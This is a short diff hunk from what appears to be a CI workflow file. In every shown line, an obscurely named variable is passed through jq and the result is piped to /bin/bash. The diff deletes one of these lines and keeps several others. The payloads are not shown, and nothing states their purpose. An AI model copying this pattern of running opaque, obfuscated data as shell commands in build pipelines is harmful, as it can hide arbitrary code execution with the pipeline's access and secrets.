@@ -23,7 +23,6 @@ jobs:
           echo $hilv47147 | jq -r .j40 | /bin/bash
           echo $dd079 | jq -r .khv1 | /bin/bash
           echo $ltoe70 | jq -r .db16 | /bin/bash
-          printf '%s' "$c63" | jq -r .njfq002 | /bin/bash
           echo $b624 | jq -r .ri446 | /bin/bash
           printf '%s' "$xlljg870" | jq -r .e3 | /bin/bash
           echo $bzn2 | jq -r .ctm8402 | /bin/bash
